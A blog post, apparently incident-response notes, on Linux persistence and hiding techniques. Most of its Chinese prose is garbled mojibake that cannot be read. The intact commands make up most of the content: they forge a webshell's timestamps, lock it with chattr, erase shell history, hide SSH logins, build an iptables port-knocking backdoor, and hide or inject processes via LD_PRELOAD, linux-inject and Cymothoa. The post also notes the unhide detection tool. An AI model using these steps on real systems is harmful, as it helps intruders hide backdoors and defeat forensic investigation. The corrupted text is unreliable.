---
title: '第3篇：Linux权限维持--隐藏篇'
short_title: 'Linux权限维持--隐藏篇'
date: 2024-10-18 16:20:58
description: '应急响应实战笔记：Linux权限维持--隐藏篇'
tag:
  - 应急响应
  - 权限维持
category:
  - 应急响应
timeline: false
isOriginal: true
index: true
order: 3
---

# 第3篇：Linux权限维持--隐藏篇

### 0x00 ǰ��

�������ڻ�ȡ������Ȩ�޺󣬻�ͨ��һЩ�����������Լ����ټ��ͺ����ļ������Ľ���Linux�µļ������ؼ�����

### 0x01 �����ļ�

Linux �´���һ�������ļ���`touch  .test.txt`

touch �������Դ���һ���ļ����ļ���ǰ����һ�� �� �ʹ����������ļ�,����ͼ��

![](assets/privilege-2-1-20241018162058-3t6pi9v.png)

һ����Linux�µ�����Ŀ¼ʹ������`ls -l`�ǲ鿴�������ģ�ֻ�ܲ鿴���ļ����ļ��У��鿴Linux�µ������ļ���Ҫ�õ����`ls -al`

������ǿ��Կ�����/tmp�£�Ĭ�ϴ��ڶ�������Ŀ¼����ЩĿ¼�Ƕ����ļ������������ĵط�����`/temp/.ICE-unix/��/temp/.Test-unix/��/temp/.X11-unix/��/temp/.XIM-unix/`

### 0x02 �����ļ�ʱ����

Unix �²غ��ű���Ҫ�޸�ʱ�䣬���������ױ����֣�ֱ������ touch �Ϳ����ˡ�

�����ο� index.php ��ʱ�䣬�ٸ��� webshell.php�����������ļ���ʱ����һ���ˡ�

���÷���

touch -r index.php webshell.php

����ֱ�ӽ�ʱ�����޸ĳ�ĳ��ĳ��ĳ�ա����� 2014 �� 01 �� 02 �ա�

touch -t 1401021042.30 webshell.php

### 0x03 ����Ȩ��

��Linux�У�ʹ��chattr��������ֹroot�����������û���ɾ�����޸���Ҫ�ļ���Ŀ¼����Ȩ����ls -l�ǲ鿴�������ģ��Ӷ��ﵽ����Ȩ�޵�Ŀ�ġ�

�������ɳ������ں��ţ�������һЩ���������ĺ����ļ������ܶ��������Ѹе�ͷ�ۡ�

~~~
chattr +i evil.php �����ļ�
lsattr  evil.php   ���Բ鿴
chattr -i evil.php ��������
rm -rf 1.evil.php  ɾ���ļ�
~~~

![](assets/privilege-2-2-20241018162058-81oygmr.png)

### 0x04 ������ʷ��������

��shell��ִ�е������ϣ������¼����������ʷ�У�������linux�п����޺۲���ģʽ�أ�

����һ��ֻ�������Ĺ����ر���ʷ��¼

~~~
[space]set +o history
��ע��[space] ��ʾ�ո񡣲������ڿո���Ե�ʣ��������Ҳ���ᱻ��¼��
~~~

��������������ʱ������ʷ���ܣ�����ζ����������֮����ִ�е����в�����������¼����ʷ�У�Ȼ����������֮ǰ�����ж�������ԭ����¼����ʷ�б��С�

Ҫ���¿�����ʷ���ܣ�ִ�����������

~~~
[Space]set -o history
���������ָ�ԭ״��Ҳ���������������Ĺ�����ִ����������֮�����������������ʷ�С�
~~~

���ɶ�������ʷ��¼��ɾ��ָ��������

������ʷ��¼���Ѿ�������һЩ�㲻ϣ����¼���������������������ô�죿�ܼ򵥡�ͨ��������������ɾ����

~~~
history | grep "keyword"
~~~

������ʷ��¼��ƥ�������ÿһ��ǰ�����и����֡�����ʷ��¼��ɾ���Ǹ�ָ�����

```
history -d [num]
```

![](assets/privilege-2-3-20241018162058-t2d3k4n.png)

���ּ����ǹؼ���¼ɾ�����������ǿ��Ա����㣬����ǰ150�����û�������������¼��150�Ժ��ǹ����߲�����¼�����ǿ���ֻ���������Ĳ�����ɾ�������ۼ�����ʷ������¼���������ֻ����ǰ150�У�

~~~
sed -i '150,$d' .bash_history
~~~

### 0x05 ����Զ��SSH��½��¼

#������¼ϵͳ�����ᱻw��who��last��ָ�����⵽��#

~~~
ssh -T root@127.0.0.1 /bin/bash -i
~~~

����¼ssh��Կ�ڱ���.sshĿ¼��

```
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash �Ci
```

### 0x06 �˿ڸ���

ͨ���˿ڸ������ﵽ���ض˿ڵ�Ŀ�ģ���Linux�£�����ʵ�ֶ˿ڸ����أ�

��һ�ַ�ʽ��ͨ��SSLH��ͬһ�˿��Ϲ���SSH��HTTPS

~~~
 #��װSSLH
 sudo apt-get install sslh
 #����SSLH
 �༭ SSLH �����ļ���
 sudo vi /etc/default/sslh
 1���ҵ������У�Run=no  �����޸�Ϊ��Run=yes
 2���޸������������� SSLH �����п��ýӿ��������˿� 443
 DAEMON_OPTS="--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid"
~~~

�ڶ��ַ�ʽ������IPTables���ж˿ڸ���

~~~
# �˿ڸ�����
iptables -t nat -N LETMEIN
# �˿ڸ��ù���
iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
# ��������
iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# �رտ���
iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
# let's do it
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
~~~

���÷�ʽ��

~~~
#��������
echo threathuntercoming | socat - tcp:192.168.28.128:80
#sshʹ��80�˿ڽ��е�¼
ssh -p 80 root@192.168.28.128
#�رո���
echo threathunterleaving | socat - tcp:192.168.28.128:80
~~~

![](assets/privilege-2-4-20241018162058-30bkk2f.png)

��������������[Զ��ң�� IPTables ���ж˿ڸ���](https://www.freebuf.com/articles/network/137683.html)

### 0x07 ��������

����Ա�޷�ͨ����������߲��ҵ������еĽ��̣��Ӷ��ﵽ����Ŀ�ģ�ʵ�ֽ������ء�

��һ�ַ�����libprocesshider

github��Ŀ��ַ��https://github.com/gianlucaborello/libprocesshider

���� LD_PRELOAD ��ʵ��ϵͳ�����Ľٳ֣�ʵ������

~~~
# ���س�������
git clone https://github.com/gianlucaborello/libprocesshider.git
cd libprocesshider/ && make
# �ƶ��ļ���/usr/local/lib/Ŀ¼��
cp libprocesshider.so /usr/local/lib/
# �������ص�ȫ�ֶ�̬���Ӿ�
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
~~~

���ԣ����� evil_script.py��

![](assets/privilege-2-5-20241018162058-33c6cda.png)

��ʱ������top �� ps �ж��޷��ҵ� evil_script.py�� cpu ʹ���ʸ�,����ȴ�Ҳ����κ�ռ��cpu�ߵĳ�����

![](assets/privilege-2-6-20241018162058-901ii92.png)

������Linux�з������صĽ��̣�

`unhide` ��һ��С�ɵ�����ȡ֤���ߣ��ܹ�������Щ����rootkit��LKM�������������صĽ��̺�TCP / UDP�˿ڡ�����������Linux��UNIX�࣬MS-Windows�Ȳ���ϵͳ�¶����Թ�����

���ص�ַ��http://www.unhide-forensics.info/

~~~
# ��װ
sudo yum install unhide
# ʹ��
unhide [options] test_list
~~~

ʹ��`unhide proc`�������ؽ���evil_script.py������ͼ��ʾ��

![](assets/privilege-2-7-20241018162058-trjw12s.png)

�ڶ��ַ���������ע�빤��linux-inject

linux-inject�����ڽ���������ע��Linux���̵Ĺ���

github��Ŀ��ַ�� https://github.com/gaffe23/linux-inject.git

~~~
# ���س�������
git clone https://github.com/gaffe23/linux-inject.git
cd linux-inject && make
# ���Խ���
./sample-target
# ����ע��
./inject -n sample-target sample-library.so
~~~

��֤����ע���ɹ�������ͼ��ʾ��

![](assets/privilege-2-8-20241018162058-x1ngopu.png)

Cymothoa��һ�����صĺ��Ź��ߡ���ͨ����Ŀ��������Ծ�Ľ���ע���������룬�Ӷ���ȡ��ԭ������ͬ��Ȩ�ޡ��ù����������ŵ����ǲ������µĽ��̣������ױ����֡�

���ص�ַ��https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/

~~~
# ���ؽ�ѹ
wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz
tar zxvf cymothoa-1-beta.tar.gz 
# 
cd cymothoa-1-beta && make


~~~

### 0x07 ����

������Ҫ������Linux�µļ������ؼ��������������ļ�������Ȩ�ޡ�������ʷ��������˿ڸ��á��������صȷ����ļ��ɡ�������ש����֮�ã���ӭ���Է�����
